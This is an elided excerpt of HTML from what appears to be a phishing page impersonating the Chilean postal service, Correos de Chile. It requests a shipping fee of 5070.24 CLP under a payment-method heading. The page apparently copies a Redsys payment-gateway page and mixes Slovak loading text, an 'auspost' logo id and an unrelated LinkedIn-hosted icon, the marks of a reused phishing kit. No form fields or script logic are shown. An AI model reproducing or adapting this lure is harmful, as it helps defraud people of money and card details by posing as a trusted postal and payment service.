...
<head id="Head1">
    ...
    <link id="Link1" rel="shortcut icon"
          href="https://media-exp1.licdn.com/dms/image/C4E0BAQEcFdxprT29iA/company-logo_200_200/0/1602244149830?e=2159024400&v=beta&t=4R75uQTD0wQQ8XilvUGdkv8e_PpTTNTVxBcnWqhrfyM">
    <link id="Link2" rel="icon" href="https://media-exp1.licdn.com/dms/image/C4E0BAQEcFdxprT29iA/company-logo_200_200/0/1602244149830?e=2159024400&v=beta&t=4R75uQTD0wQQ8XilvUGdkv8e_PpTTNTVxBcnWqhrfyM"
          type="image/ico">
    <script language="javascript" type="text/javascript"
    ...
    <div id="showLoading" style="display: none;">
        <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
            <div class="load-container load">
                <div class="loader">
                    <span id="cargar">Načítavanie..</span></div>
            </div>
        </div>
    </div>
            ...
            <div id="cabecera" class="container ogilvy-bg-white">
                <div class="row">
                    <div class="col-xs-12 text-center ogilvy-header">
                        <img src="./Redsys_files/nono.png" id="logoauspost"
                            ...
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">
                                ...
                                <div id="Panel1" class="ogilvy-subtitular">
                                    ...
                                    <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                        ...
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                             class="ogilvy-titular">
                                            <span id="concepto" class="descripcionPago" style="font-weight:bold;">Correos de Chile</span><span
                                                    id="conceptovalor" style="font-weight:normal;"></span>
                                        </div>
                                    </div>
                                ...
                                <div class="ogilvy-titular">
                                    <span id="lbTitle" style="text-decoration: underline;" class="titulo">Gastos de envío: <b>5070,24 CLP</b></span>
                                </div>
                                <div id="divSubtitularPago" class="ogilvy-subtitular ogilvy-subtitular-grande">

                                    <span id="lbSubTittle" class="subtitulo">Forma de pago:</span><br>
                ...
                <div id="updPanel">
                    ...
                    <div id="updateProgress" style="display:none;" role="status" aria-hidden="true">
                        ...
                        <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                            <div class="load-container load">
                                <div class="loader">
                                    <span id="loading">Načítavanie..</span></div>
                            </div>
                        </div>
